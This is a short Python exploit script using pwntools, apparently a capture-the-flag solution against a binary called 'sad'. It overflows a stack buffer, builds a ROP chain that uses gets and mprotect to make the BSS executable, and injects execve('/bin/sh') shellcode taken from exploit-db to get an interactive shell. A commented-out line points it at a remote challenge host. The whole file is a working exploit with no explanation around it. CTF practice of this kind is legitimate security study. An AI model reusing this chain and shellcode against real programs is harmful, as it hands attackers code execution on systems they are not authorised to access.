from pwn import *

context.clear(arch="amd64")
context.log_level = "DEBUG"

#BSS = 0x00000000004b0240
BSS = 0x00000000004b0000 # Needs to be page-aligned for mprotect

e = ELF("./sad")
rop = ROP(e)

rop.gets(BSS) # Write shellcode to memory
rop.mprotect(BSS, 0x100, 0x1 | 0x2 | 0x4) # Make page executable
rop.raw(BSS) # Jump to the shellcode

print(rop.dump())

p = process("./sad")
#p = remote("jh2i.com", 50002)

#gdb.attach(p)

payload = rop.chain()

p.recvline()
p.sendline(b"A" * 256 + b"BBBBBBBB" + payload)

#https://www.exploit-db.com/exploits/42179
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
p.sendline(b"\x90\x90\x90\x90\x90\x90\x90\x90" + shellcode)

p.interactive()
